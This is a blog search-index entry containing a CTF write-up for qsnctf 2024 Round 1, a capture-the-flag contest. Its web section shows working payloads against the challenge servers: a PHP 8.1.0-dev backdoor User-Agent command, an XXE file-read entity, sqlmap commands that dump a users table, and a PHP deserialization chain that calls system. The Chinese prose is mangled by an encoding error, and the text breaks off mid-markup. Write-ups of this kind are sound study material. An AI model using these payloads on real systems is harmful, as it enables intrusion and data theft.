<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>qsnctf-2024#Round1</title>
    <link href="/posts/14e77824/"/>
    <url>/posts/14e77824/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="EasyMD5"><a href="#EasyMD5" class="headerlink" title="EasyMD5"></a>EasyMD5</h2><p>è€ƒæŸ¥ <code>MD5ç¢°æ’</code></p><p><img src="/posts/14e77824/image-20240229194659778.png" alt="image-20240229194659778"></p><p>éšä¾¿ä¸Šä¼ æ–‡ä»¶ï¼Œå°†å…¶å‘é€åˆ° Repeater</p><p><img src="/posts/14e77824/image-20240229193959031.png" alt="image-20240229193959031"></p><p>å‘ç°éœ€è¦ pdf çš„ MIME</p><p>è®¾ç½® Content-Type ä¸º application&#x2F;pdf</p><p><img src="/posts/14e77824/image-20240229194119131.png" alt="image-20240229194119131"></p><p>çŒœæµ‹é¢˜ç›®æ„æ€ä¸ºä¸åŒæ–‡ä»¶ï¼Œä½†éœ€è¦ &#96;md5($a) &#x3D;&#x3D; md5($b)</p><p>æ ¹æ®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;240610708&#x27;</span>); <span class="hljs-comment">// = 0e462097431906509019562988736854</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>); <span class="hljs-comment">// = 0e830400451993494058024219903391</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span> == <span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æ–‡ä»¶å†…å®¹ä¿®æ”¹ä¸º <code>240610708</code> ä¸ <code>QNKCDZO</code></p><p><img src="/posts/14e77824/image-20240229194526180.png" alt="image-20240229194526180"></p><h2 id="PHPçš„åé—¨"><a href="#PHPçš„åé—¨" class="headerlink" title="PHPçš„åé—¨"></a>PHPçš„åé—¨</h2><p><img src="/posts/14e77824/image-20240229194751015.png" alt="image-20240229194751015"></p><p>æ ¹æ®æç¤ºæŸ¥çœ‹ æœåŠ¡å™¨phpç‰ˆæœ¬</p><p><img src="/posts/14e77824/image-20240229194832339.png" alt="image-20240229194832339"></p><p>æœç´¢å¯çŸ¥æ­¤ç‰ˆæœ¬æœ‰è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</p><p>ä¿®æ”¹ <code>User-Agentt: zerodiumsystem(&quot;cat /flag&quot;);</code></p><p><img src="/posts/14e77824/image-20240229195032492.png" alt="image-20240229195032492"></p><h2 id="PHPçš„XXE"><a href="#PHPçš„XXE" class="headerlink" title="PHPçš„XXE"></a>PHPçš„XXE</h2><p>ç»™äº† phpinfo</p><p><img src="/posts/14e77824/image-20240229195407720.png" alt="image-20240229195407720"></p><p>æœç´¢å¯çŸ¥ dom.php å¯ä»¥è§¦å‘XXEæ¼æ´</p><p>éšæ‰‹æ‹¿ä¸ªpoc</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span>[ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">test</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/posts/14e77824/image-20240229195634852.png" alt="image-20240229195634852"></p><h2 id="Easy-SQLi"><a href="#Easy-SQLi" class="headerlink" title="Easy_SQLi"></a>Easy_SQLi</h2><p>ç®€å•çš„å¸ƒå°”ç›²æ³¨ï¼Œé¡ºä¾¿è¯•ä¸‹ sqlmap</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -u &quot;http://challenge.qsnctf.com:30832/login.php&quot; --data &quot;uname=*&amp;psw=*&quot; --technique B --batch --risk 3 --threads=10 --dbs<br></code></pre></td></tr></table></figure><p><img src="/posts/14e77824/image-20240301185843180.png" alt="image-20240301185843180"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -u &quot;http://challenge.qsnctf.com:30832/login.php&quot; --data &quot;uname=*&amp;psw=*&quot; --technique B --batch --risk 3 --threads=10 -D qsnctf --tables<br></code></pre></td></tr></table></figure><p><img src="/posts/14e77824/image-20240301185923577.png" alt="image-20240301185923577"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -u &quot;http://challenge.qsnctf.com:30832/login.php&quot; --data &quot;uname=*&amp;psw=*&quot; --technique B --batch --risk 3 --threads=10 -D qsnctf -T users --columns<br></code></pre></td></tr></table></figure><p><img src="/posts/14e77824/image-20240301190001650.png" alt="image-20240301190001650"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -u &quot;http://challenge.qsnctf.com:30832/login.php&quot; --data &quot;uname=*&amp;psw=*&quot; --technique B --batch --risk 3 --threads=10 -D qsnctf -T users -C password,username --dump<br></code></pre></td></tr></table></figure><p><img src="/posts/14e77824/image-20240301190127496.png" alt="image-20240301190127496"></p><h2 id="é›å½¢ç³»ç»Ÿ"><a href="#é›å½¢ç³»ç»Ÿ" class="headerlink" title="é›å½¢ç³»ç»Ÿ"></a>é›å½¢ç³»ç»Ÿ</h2><p>php ååºåˆ—åŒ–</p><p>æ‹¿ dirsearch æ‰«äº†ä¸€ä¸‹å¾—åˆ° &#x2F;<a href="http://www.zip/">www.zip</a></p><p><img src="/posts/14e77824/image-20240301191342399.png" alt="image-20240301191342399"></p><p>å‘ç°phpåŠ å¯†äº†</p><p>æ‰¾ä¸ªè§£å¯†ç½‘ç«™å¾—åˆ°åŸå§‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">shi</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$next</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;next::<span class="hljs-title function_ invoke__">PLZ</span>(<span class="hljs-variable">$this</span>-&gt;pass);<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">wo</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$sex</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$intention</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hi Try serialize Me!&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">inspect</span>();<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inspect</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;sex==<span class="hljs-string">&#x27;boy&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;age==<span class="hljs-string">&#x27;eighteen&#x27;</span>)<br>            &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;intention;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ğŸ™…18å²ğŸˆ²&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callStatic</span>(<span class="hljs-params"><span class="hljs-variable">$action</span>, <span class="hljs-variable">$do</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$b</span>;<br>            <span class="hljs-variable">$b</span>(<span class="hljs-variable">$do</span>[<span class="hljs-number">0</span>]);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;==================PLZ Input Your Name!==================&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>==<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp;<span class="hljs-variable">$b</span>==<span class="hljs-string">&quot;&#x27;k1fuhu&#x27;s test demo&quot;</span>)<br>    &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;ç™»å½•æˆåŠŸ&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ€è·¯å¾ˆæ¸…æ™°</p><p>ç›´æ¥æ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> wo;<br><span class="hljs-variable">$c</span>-&gt;sex = <span class="hljs-string">&quot;boy&quot;</span>;<br><span class="hljs-variable">$c</span>-&gt;age = <span class="hljs-string">&quot;eighteen&quot;</span>;<br><span class="hljs-variable">$Shit</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">shi</span>();<br><span class="hljs-variable">$damn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>;<br><span class="hljs-variable">$damn</span>-&gt;<span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$damn</span>-&gt;<span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$Shit</span>-&gt;next = <span class="hljs-variable">$damn</span>;<br><span class="hljs-variable">$Shit</span>-&gt;pass = <span class="hljs-string">&quot;cat /flag&quot;</span>;<br><span class="hljs-variable">$c</span>-&gt;intention = <span class="hljs-variable">$Shit</span>;<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">O<span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;wo&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;sex&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;boy&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;age&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;eighteen&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">9</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;intention&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;shi&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;next&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Demo&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;a&quot;</span>;N;s<span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;system&quot;</span>;<span class="hljs-punctuation">&#125;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;pass&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">9</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;cat /flag&quot;</span>;<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/posts/14e77824/image-20240301191546616.png" alt="image-20240301191546616"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="è§£ä¸ªæ–¹ç¨‹"><a href="#è§£ä¸ªæ–¹ç¨‹" class="headerlink" title="è§£ä¸ªæ–¹ç¨‹"></a>è§£ä¸ªæ–¹ç¨‹</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">æ¬¢è¿æ¥åˆ°é’å°‘å¹´CTFï¼Œé¢†å–ä½ çš„é¢˜ç›®ï¼Œè¿›è¡Œè§£ç­”å§ï¼è¿™æ˜¯ä¸€é“æ•°å­¦é¢˜ï¼ï¼<br>    p = 70559223834693127821574754764487916409<br>    q = 291568698992769291833060922537869705687<br>    e = 65537<br>    d = ?<br>    <br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br>p = <span class="hljs-number">70559223834693127821574754764487916409</span><br>q = <span class="hljs-number">291568698992769291833060922537869705687</span><br>e = <span class="hljs-number">65537</span><br> <br>s = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e,s)<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;dec: &quot;</span> + <span class="hljs-built_in">str</span>(d))<br></code></pre></td></tr></table></figure><h2 id="ez-log"><a href="#ez-log" class="headerlink" title="ez_log"></a>ez_log</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br>flag=<span class="hljs-string">b&#x27;key&#123;xxxxxxx&#125;&#x27;</span><br>m=bytes_to_long(flag)<br>p=<span class="hljs-number">3006156660704242356836102321001016782090189571028526298055526061772989406357037170723984497344618257575827271367883545096587962708266010793826346841303043716776726799898939374985320242033037</span><br>g=<span class="hljs-number">3</span><br>c=<span class="hljs-built_in">pow</span>(g,m,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c=&#x27;</span>,c)<br><br>    c=<span class="hljs-number">1409970374102613813154760568158003123875011225002977256272054381228289122265018484564640527366469489471011960208090567829620353663244080501413923713114331075726206212331906003182378049316620</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># å·²çŸ¥çš„å‚æ•°</span><br>p = <span class="hljs-number">3006156660704242356836102321001016782090189571028526298055526061772989406357037170723984497344618257575827271367883545096587962708266010793826346841303043716776726799898939374985320242033037</span><br>g = <span class="hljs-number">3</span><br>c = <span class="hljs-number">1409970374102613813154760568158003123875011225002977256272054381228289122265018484564640527366469489471011960208090567829620353663244080501413923713114331075726206212331906003182378049316620</span><br><br><span class="hljs-comment"># è®¡ç®—ç¦»æ•£å¯¹æ•°</span><br>m = discrete_log(p, c, g)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;m =&quot;</span>, long_to_bytes(m))<br></code></pre></td></tr></table></figure><p><img src="/posts/14e77824/image-20240229201301587.png" alt="image-20240229201301587"></p><h2 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h2><p>é¢˜å¹²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>flag = <span class="hljs-string">b&#x27;qsnctf&#123;xxx-xxxx-xxxx-xxxx-xxxxxxxxx&#125;&#x27;</span><br>m = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>r = getPrime(<span class="hljs-number">512</span>)<br>n = p * q * r<br>leak = p * q<br>e = <span class="hljs-number">0x10001</span><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;leak = <span class="hljs-subst">&#123;leak&#125;</span>&#x27;</span>)<br><span class="hljs-comment"># c = 173595148273920891298949441727054328036798235134009407863895058729356993814829340513336567479145746034781201823694596731886346933549577879568197521436900228804336056005940048086898794965549472641334237175801757569154295743915744875800647234151498117718087319013271748204766997008772782882813572814296213516343420236873651060868227487925491016675461540894535563805130406391144077296854410932791530755245514034242725719196949258860635915202993968073392778882692892</span><br><span class="hljs-comment"># n = 1396260492498511956349135417172451037537784979103780135274615061278987700332528182553755818089525730969834188061440258058608031560916760566772742776224528590152873339613356858551518007022519033843622680128062108378429621960808412913676262141139805667510615660359775475558729686515755127570976326233255349428771437052206564497930971797497510539724340471032433502724390526210100979700467607197448780324427953582222885828678441579349835574787605145514115368144031247</span><br><span class="hljs-comment"># leak = 152254254502019783796170793516692965417859793325424454902983763285830332059600151137162944897787532369961875766745853731769162511788354655291037150251085942093411304833287510644995339391240164033052417935316876168953838783742499485868268986832640692657031861629721225482114382472324320636566226653243762620647</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>r=n//leak<br>d=inverse_mod(<span class="hljs-number">65537</span>,r-<span class="hljs-number">1</span>)<br>m=<span class="hljs-built_in">pow</span>(c,d,r)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="factor1"><a href="#factor1" class="headerlink" title="factor1"></a>factor1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>d = getPrime(<span class="hljs-number">256</span>)<br>e = gmpy2.invert(d, (p**<span class="hljs-number">2</span> - <span class="hljs-number">1</span>) * (q**<span class="hljs-number">2</span> - <span class="hljs-number">1</span>))<br>flag = <span class="hljs-string">&quot;qsnctf&#123;&quot;</span> + hashlib.md5(<span class="hljs-built_in">str</span>(p + q).encode()).hexdigest() + <span class="hljs-string">&quot;&#125;&quot;</span><br><span class="hljs-built_in">print</span>(e)<br><span class="hljs-built_in">print</span>(p * q)<br><span class="hljs-comment"># 4602579741478096718172697218991734057017874575484294836043557658035277770732473025335441717904100009903832353915404911860888652406859201203199117870443451616457858224082143505393843596092945634675849883286107358454466242110831071552006337406116884147391687266536283395576632885877802269157970812862013700574069981471342712011889330292259696760297157958521276388120468220050600419562910879539594831789625596079773163447643235584124521162320450208920533174722239029506505492660271016917768383199286913178821124229554263149007237679675898370759082438533535303763664408320263258144488534391712835778283152436277295861859</span><br><span class="hljs-comment"># 78665180675705390001452176028555030916759695827388719494705803822699938653475348982551790040292552032924503104351703419136483078949363470430486531014134503794074329285351511023863461560882297331218446027873891885693166833003633460113924956936552466354566559741886902240131031116897293107970411780310764816053</span><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>A=matrix(ZZ,<span class="hljs-number">2</span>)<br>A[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]=<span class="hljs-number">2</span>**<span class="hljs-number">1024</span><br>A[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>]=e<br>A[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>]=n^<span class="hljs-number">2</span><br>res=A.LLL()<br><span class="hljs-built_in">print</span>(res[<span class="hljs-number">0</span>])<br>x=res[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]<br>d=x//(<span class="hljs-number">2</span>**<span class="hljs-number">1024</span>)<br>k=(e*d-<span class="hljs-number">1</span>)//(n^<span class="hljs-number">2</span>)+<span class="hljs-number">1</span><br>p2q2=<span class="hljs-number">1</span>+n^<span class="hljs-number">2</span>-(e*d-<span class="hljs-number">1</span>)//k<br>pq=isqrt(p2q2+<span class="hljs-number">2</span>*n)<br>flag = <span class="hljs-string">&quot;qsnctf&#123;&quot;</span> + hashlib.md5(<span class="hljs-built_in">str</span>(pq).encode()).hexdigest() + <span class="hljs-string">&quot;&#125;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="å››é‡åŠ å¯†"><a href="#å››é‡åŠ å¯†" class="headerlink" title="å››é‡åŠ å¯†"></a>å››é‡åŠ å¯†</h2><p><img src="/posts/14e77824/image-20240301190709763.png" alt="image-20240301190709763"></p><p>base32</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs base32">OFZW4Y3UMY======<br>qsnctf<br></code></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-symbol">&amp;#122;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#121;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#123;</span><span class="hljs-symbol">&amp;#109;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#109;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#109;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#122;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#95;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#122;</span><span class="hljs-symbol">&amp;#98;</span><span class="hljs-symbol">&amp;#104;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#95;</span><span class="hljs-symbol">&amp;#107;</span><span class="hljs-symbol">&amp;#119;</span><span class="hljs-symbol">&amp;#109;</span><span class="hljs-symbol">&amp;#113;</span><span class="hljs-symbol">&amp;#122;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#125;</span><span class="hljs-symbol">&amp;#124;</span><span class="hljs-symbol">&amp;#107;</span><span class="hljs-symbol">&amp;#101;</span><span 